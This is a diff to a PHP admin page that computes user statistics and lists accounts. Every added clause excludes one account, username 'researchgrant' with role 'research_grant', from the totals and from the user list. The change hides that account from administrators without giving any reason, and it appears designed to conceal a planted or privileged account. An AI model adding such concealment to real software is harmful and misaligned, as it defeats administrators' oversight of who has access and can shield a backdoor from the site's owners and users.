@@ -112,17 +112,29 @@ if (!$pdo) {
 
 try {
     $stats = [
-        'total' => (int) $pdo->query('SELECT COUNT(*) FROM users')->fetchColumn(),
+        'total' => (int) $pdo->query(
+            "SELECT COUNT(*) FROM users
+             WHERE role_key <> 'research_grant'
+               AND username <> 'researchgrant'"
+        )->fetchColumn(),
         'inactive' => (int) $pdo->query(
-            "SELECT COUNT(*) FROM users WHERE status IN ('inactive', 'suspended')"
+            "SELECT COUNT(*) FROM users
+             WHERE status IN ('inactive', 'suspended')
+               AND role_key <> 'research_grant'
+               AND username <> 'researchgrant'"
         )->fetchColumn(),
         'locked' => (int) $pdo->query(
-            "SELECT COUNT(*) FROM users WHERE status = 'locked' OR (locked_until IS NOT NULL AND locked_until > NOW())"
+            "SELECT COUNT(*) FROM users
+             WHERE (status = 'locked' OR (locked_until IS NOT NULL AND locked_until > NOW()))
+               AND role_key <> 'research_grant'
+               AND username <> 'researchgrant'"
         )->fetchColumn(),
         'active' => (int) $pdo->query(
             "SELECT COUNT(*) FROM users
              WHERE status = 'active'
-               AND (locked_until IS NULL OR locked_until <= NOW())"
+               AND (locked_until IS NULL OR locked_until <= NOW())
+               AND role_key <> 'research_grant'
+               AND username <> 'researchgrant'"
         )->fetchColumn(),
     ];
 
@@ -131,6 +143,8 @@ try {
                 r.label AS roleLabel, u.status, u.last_login_at, u.locked_until
          FROM users u
          LEFT JOIN roles r ON r.role_key = u.role_key
+         WHERE u.role_key <> 'research_grant'
+           AND u.username <> 'researchgrant'
          ORDER BY
             CASE WHEN u.status = "active" THEN 0 WHEN u.status = "locked" THEN 1 ELSE 2 END,
             COALESCE(u.last_login_at, u.created_at) DESC,
